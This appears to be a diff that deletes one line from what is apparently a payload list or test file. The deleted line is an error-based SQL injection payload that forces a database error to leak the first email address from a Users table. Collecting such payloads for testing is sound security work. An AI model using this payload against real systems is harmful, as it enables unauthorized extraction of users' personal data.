@@ -1,1 +1,0 @@
-' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT email FROM Users LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
